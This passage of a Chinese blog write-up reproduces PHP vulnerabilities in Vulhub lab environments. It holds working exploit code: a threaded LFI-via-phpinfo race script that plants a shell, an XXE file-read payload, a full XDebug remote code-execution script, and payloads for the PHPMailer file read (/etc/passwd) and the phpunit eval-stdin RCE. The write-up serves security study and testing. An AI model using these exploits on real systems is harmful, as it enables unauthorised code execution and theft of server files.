%s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phpInfoLFI</span>(<span class="params">host, port, phpinforeq, offset, lfireq, tag</span>):</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadWorker</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, e, l, m, *args</span>):</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">&quot;\nGot it! Shell created in /tmp/g&quot;</span></span><br><span class="line">                    self.event.set()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOffset</span>(<span class="params">host, port, phpinforeq</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line"></span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">&quot;0\r\n\r\n&quot;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;No php tmp_name in phpinfo output&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;found %s at %i&quot;</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;LFI With PHPInfo()&quot;</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;-=&quot;</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with poolsz %d: %s&quot;</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Getting initial offset...&quot;</span>,</span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">&quot;\r% 4d / % 4d&quot;</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;Woot!  \m/&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;:(&quot;</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;\nTelling threads to shutdown...&quot;</span></span><br><span class="line">        e.set()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Shuttin&#x27; down...&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>Vulhub上的环境有两个php页面</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpinfo.php</span><br><span class="line">lfi.php</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIM截图20200506121755.png" style="zoom:80%;">
+
+<img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIM截图20200506121709.png" style="zoom:80%;">
+
+<h2 id="XML外部实体注入漏洞"><a href="#XML外部实体注入漏洞" class="headerlink" title="XML外部实体注入漏洞"></a>XML外部实体注入漏洞</h2><h3 id="漏洞简介-4"><a href="#漏洞简介-4" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>该漏洞主要危害：任意文件读取，ssrf</p>
+<p>libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。</p>
+<h3 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>网站目录结构：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimpleXMLElement.php  dom.php  index.php  simplexml_load_string.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>simplexml_load_string.php：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$xml = simplexml_load_string($data);</span><br><span class="line"><span class="keyword">echo</span> $xml-&gt;name;</span><br></pre></td></tr></table></figure>
+
+<p><strong>SimpleXMLElement.php：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$xml = <span class="keyword">new</span> SimpleXMLElement($data);</span><br><span class="line"><span class="keyword">echo</span> $xml-&gt;name;</span><br></pre></td></tr></table></figure>
+
+<p><strong>dom.php:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($data);</span><br><span class="line">print_r($dom);</span><br></pre></td></tr></table></figure>
+
+<p>我们可以构造读取文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/resource=/var/www/html/dom.php&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIM截图20200506123059.png" style="zoom:80%;">
+
+<h2 id="XDebug远程调试漏洞"><a href="#XDebug远程调试漏洞" class="headerlink" title="XDebug远程调试漏洞"></a>XDebug远程调试漏洞</h2><h3 id="漏洞简介-5"><a href="#漏洞简介-5" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>该漏洞可导致代码执行。</p>
+<p>XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置<code>remote_connect_back = 1</code>，即如下配置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_connect_back &#x3D; 1</span><br><span class="line">xdebug.remote_enable &#x3D; 1</span><br></pre></td></tr></table></figure>
+
+<p>这个配置下，我们访问<code>http://target/index.php?XDEBUG_SESSION_START=phpstorm</code>，目标服务器的XDebug将会连接访问者的IP（或<code>X-Forwarded-For</code>头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。</p>
+<h3 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>因为需要使用dbgp协议与目标服务器通信，所以无法用http协议复现漏洞</p>
+<p>python3 exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(<span class="number">1</span>)</span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recv_xml</span>(<span class="params">sock</span>):</span></span><br><span class="line">    blocks = []</span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data + sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> data:</span><br><span class="line">            eop = data.find(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> eop &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            blocks.append(data[:eop])</span><br><span class="line">            data = data[eop+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(blocks) &gt;= <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> blocks[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger</span>(<span class="params">url</span>):</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session.get(url + <span class="string">&#x27;?XDEBUG_SESSION_START=phpstorm&#x27;</span>, timeout=<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;XDebug remote debug code execution.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, required=<span class="literal">True</span>, help=<span class="string">&#x27;the code you want to execute.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--target&#x27;</span>, required=<span class="literal">True</span>, help=<span class="string">&#x27;target url.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-l&#x27;</span>, <span class="string">&#x27;--listen&#x27;</span>, default=<span class="number">9000</span>, type=int, help=<span class="string">&#x27;local port&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    ip_port = (<span class="string">&#x27;0.0.0.0&#x27;</span>, args.listen)</span><br><span class="line">    sk = socket.socket()</span><br><span class="line">    sk.settimeout(<span class="number">10</span>)</span><br><span class="line">    sk.bind(ip_port)</span><br><span class="line">    sk.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    pool.submit(trigger, args.target)</span><br><span class="line">    conn, addr = sk.accept()</span><br><span class="line">    conn.sendall(<span class="string">b&#x27;&#x27;</span>.join([<span class="string">b&#x27;eval -i 1 -- &#x27;</span>, base64.b64encode(args.code.encode()), <span class="string">b&#x27;\x00&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    data = recv_xml(conn)</span><br><span class="line">    print(<span class="string">&#x27;[+] Recieve data: &#x27;</span> + data.decode())</span><br><span class="line">    g = re.search(r<span class="string">b&#x27;&lt;\!\[CDATA\[([a-z0-9=\./\+]+)\]\]&gt;&#x27;</span>, data, re.I)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> g:</span><br><span class="line">        print(<span class="string">&#x27;[-] No result...&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    data = g.group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="string">&#x27;[+] Result: &#x27;</span> + base64.b64decode(data).decode())</span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        print(<span class="string">&#x27;[-] May be not string result...&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意：</strong>因为该通信是一个反向连接的过程，exp.py启动后其实是会监听本地的9000端口（可通过-l参数指定）并等待XDebug前来连接，所以执行该脚本的服务器必须有外网IP（或者与目标服务器处于同一内网）</p>
+<img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIM截图20200506140437.png" style="zoom:80%;">
+
+<h2 id="CVE-2017-5223"><a href="#CVE-2017-5223" class="headerlink" title="CVE-2017-5223"></a>CVE-2017-5223</h2><h3 id="漏洞简介-6"><a href="#漏洞简介-6" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>该漏洞可导致任意文件读取。</p>
+<p>PHPMailer是堪称全球最流行邮件发送类，其全球范围内的用户量大约有900万，被诸多开源项目所采用，包括WordPress、Drupal、1CRM、Joomla!等</p>
+<p>PHPMailer在发送邮件的过程中，会在邮件内容中寻找图片标签（<code>&lt;img src=&quot;...&quot;&gt;</code>），并将其src属性的值提取出来作为附件。所以，如果我们能控制部分邮件内容，可以利用<code>&lt;img src=&quot;/etc/passwd&quot;&gt;</code>将文件<code>/etc/passwd</code>作为附件读取出来，造成任意文件读取漏洞。</p>
+<h3 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>搭建好环境我们看下源码：</p>
+<p><strong>index.php:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require &#39;vendor&#x2F;autoload.php&#39;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;your-name&#39;], $_POST[&#39;your-email&#39;], $_POST[&#39;your-message&#39;])) &#123;</span><br><span class="line">    $mail &#x3D; new PHPMailer();</span><br><span class="line">    $mail-&gt;isSMTP();</span><br><span class="line">    $mail-&gt;Host &#x3D; $_ENV[&#39;SMTP_SERVER&#39;];</span><br><span class="line">    $mail-&gt;SMTPAuth &#x3D; true;</span><br><span class="line">    $mail-&gt;Username &#x3D; $_ENV[&#39;SMTP_EMAIL&#39;];</span><br><span class="line">    $mail-&gt;Password &#x3D; $_ENV[&#39;SMTP_PASSWORD&#39;];</span><br><span class="line">    $mail-&gt;Port &#x3D; intval($_ENV[&#39;SMTP_PORT&#39;]);</span><br><span class="line">    $mail-&gt;CharSet &#x3D; &#39;UTF-8&#39;;</span><br><span class="line">    if (in_array($_ENV[&#39;SMTP_SECURE&#39;], [&#39;tls&#39;, &#39;ssl&#39;])) &#123;</span><br><span class="line">        $mail-&gt;SMTPSecure &#x3D; $_ENV[&#39;SMTP_SECURE&#39;];</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $mail-&gt;SMTPSecure &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $message &#x3D; &lt;&lt;&lt;DATA</span><br><span class="line">&lt;p&gt;&lt;strong&gt;&#123;$_POST[&#39;your-name&#39;]&#125;&lt;&#x2F;strong&gt;您好，您反馈的意见如下：&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;blackquote&gt;&#123;$_POST[&#39;your-message&#39;]&#125;&lt;&#x2F;blockquote&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;我们将在24小时内给予您回复，请耐心等待！&lt;&#x2F;p&gt;</span><br><span class="line">DATA;</span><br><span class="line">    $mail-&gt;SetFrom($_POST[&quot;your-email&quot;], $_POST[&quot;your-name&quot;]);</span><br><span class="line">    $mail-&gt;AddAddress($_POST[&quot;your-email&quot;], $_POST[&quot;your-name&quot;]);</span><br><span class="line">    $mail-&gt;Subject &#x3D; &quot;您反馈的意见我们已经收到&quot;;</span><br><span class="line">    $mail-&gt;MsgHTML($message);</span><br><span class="line">    if(!$mail-&gt;Send()) echo &quot;Error: &quot;.$mail-&gt;ErrorInfo; else echo &quot;Success!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>PHPMailer类在<code>vendor/phpmailer/phpmailer</code>下面</p>
+<p>由于自己的是阿里云，好像搭不了邮件服务器，也没复现成功2333…</p>
+<p>搭建好的环境如图：</p>
+<img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIM截图20200506210641.png" style="zoom:67%;">
+
+<p>“意见反馈”页面，正常用户填写昵称、邮箱、意见提交，这些信息将被后端储存，同时后端会发送一封邮件提示用户意见填写完成。该场景在实战中很常见，比如用户注册网站成功后，通常会收到一封包含自己昵称的通知邮件，那么，我们在昵称中插入恶意代码，目标服务器上的文件将以附件的形式被读取出来。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="CVE-2017-9841"><a href="#CVE-2017-9841" class="headerlink" title="CVE-2017-9841"></a>CVE-2017-9841</h2><h3 id="漏洞简介-7"><a href="#漏洞简介-7" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>该漏洞可导致代码执行。</p>
+<p>composer是php包管理工具，使用composer安装扩展包将会在当前目录创建一个vendor文件夹，并将所有文件放在其中。通常这个目录需要放在web目录外，使用户不能直接访问。</p>
+<p>phpunit是php中的单元测试工具，其4.8.19 ~ 4.8.27和5.0.10 ~ 5.6.2版本的<code>vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code>文件有如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;?&gt;&#x27;</span>.file_get_contents(<span class="string">&#x27;php://input&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+<p>如果该文件被用户直接访问到，将造成远程代码执行漏洞。</p>
+<h3 id="漏洞复现-7"><a href="#漏洞复现-7" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>直接将PHP代码作为POST Body发送给</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//yourip:8080/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/1.png"></p>
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.m00nback.xyz/2020/05/05/Vulhub%E4%B9%8Bphp/>http://www.m00nback.xyz/2020/05/05/Vulhub%E4%B9%8Bphp/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-05-06T21:45:28+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2020年5月6日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
